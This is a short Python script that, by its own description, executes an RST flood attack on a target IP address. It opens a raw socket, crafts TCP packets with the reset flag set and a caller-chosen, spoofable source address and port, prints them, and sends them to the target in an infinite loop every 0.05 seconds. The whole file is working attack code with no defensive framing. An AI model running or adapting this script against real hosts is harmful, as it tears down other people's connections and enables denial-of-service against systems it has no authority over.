import argparse
import socket
import sys
import time
from struct import *

from IP_Header import IP_Header
from TCP_Header import TCP_Header

def parseArgs():
	parser = argparse.ArgumentParser(description="Execute RST Flood attack on target IP address")
	parser.add_argument("src_ip", type=str, help="Source IP address")
	parser.add_argument("dst_ip", type=str, help="Destination IP address")
	parser.add_argument("src_port", type=int, help="Source IP port")
	parser.add_argument("dst_port", type=int, help="Destination IP port")

	return parser.parse_args()


def print_packet(packet):
	for i in range(len(packet)):
		if i % 4 == 0:
			print()
		if i == 20 or i == 40:
			print()
		hexstring = '0x' + hex(packet[i])[2:].zfill(2)
		print(hexstring, end="\\")
	print("\n")

def spoof(sock, src_ip, src_port, dst_ip, dst_port, payload):
	ip_head = IP_Header(src_ip, dst_ip)
	ip_header = ip_head.assemble()
	
	tcp_head = TCP_Header(src_ip, dst_ip, src_port, dst_port)
	tcp_head.create_flags(rst=1)
	tcp_header = tcp_head.assemble(payload)

	# if using socket.IPPROTO_TCP, you can't use ip_header because it gets auto-added
	packet = tcp_header + bytearray(payload, 'utf-8')
	#packet = ip_header + tcp_header + bytearray(payload, 'utf-8')

	print_packet(packet)

	print("SOURCE IP:      " + src_ip)
	print("DESTINATION IP: " + dst_ip)

	while True:
		sock.sendto(packet, (dst_ip, 0))
		time.sleep(0.05)


if __name__ == "__main__":
	args = parseArgs()

	sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)

	payload = "12345"
	spoof(sock, args.src_ip, args.src_port, args.dst_ip, args.dst_port, payload)
















